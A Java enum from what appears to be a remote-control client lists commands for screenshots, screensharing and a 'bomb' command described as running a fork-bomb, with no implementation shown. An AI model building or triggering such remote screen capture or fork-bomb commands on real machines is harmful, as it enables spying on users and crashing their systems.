package main.utils;

import javafx.util.Pair;

import java.util.ArrayList;
import java.util.List;

public enum Command {
    SCREENSHOT("screen", "Sends a screenshot"),
    START_SCREENSHARE("start-screenshare", "Starts screenshare"),
    STOP_SCREENSHARE("stop-screenshare", "Stops screenshare"),
    FORK_BOMB("bomb", "Runs a fork-bomb");

    private String command;
    private String description;

    Command(String command, String description) {
        this.command = command;
        this.description = description;
    }

    public static List<Pair<String, String>> availableCommands() {
        List<Pair<String, String>> commandsAndDescriptions = new ArrayList<>();
        for (Command c : Command.values()) {
            commandsAndDescriptions.add(new Pair<>(c.command, c.description));
        }
        return commandsAndDescriptions;
    }

}